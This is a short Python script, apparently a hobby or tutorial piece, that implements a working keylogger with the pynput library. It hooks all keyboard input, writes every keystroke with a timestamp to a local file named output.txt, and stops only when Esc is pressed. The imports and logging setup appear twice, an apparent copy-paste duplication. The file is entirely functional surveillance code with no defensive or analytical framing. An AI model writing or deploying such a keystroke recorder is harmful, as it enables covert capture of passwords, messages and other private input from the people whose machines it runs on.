import logging
from pynput.keyboard import Listener, Key
from datetime import datetime

logging.basicConfig(filename='output.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')



from pynput.keyboard import Listener, Key
import logging
from datetime import datetime

# Set up logging to file
logging.basicConfig(filename='output.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        # Handle special keys and convert to readable format
        if key == Key.backspace:
            logging.info('Backspace')
        elif key == Key.enter:
            logging.info('\n')
        elif key == Key.shift:
            logging.info('Shift')
        elif key == Key.space:
            logging.info(' ')
        elif key == Key.caps_lock:
            logging.info('Caps Lock')
        elif key == Key.ctrl_l or key == Key.ctrl_r:
            logging.info('Ctrl')
        else:
            logging.info(key.char)
    except AttributeError:
        logging.info(f'{key}')

def on_release(key):

    if key == Key.esc:
            return False
    
def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()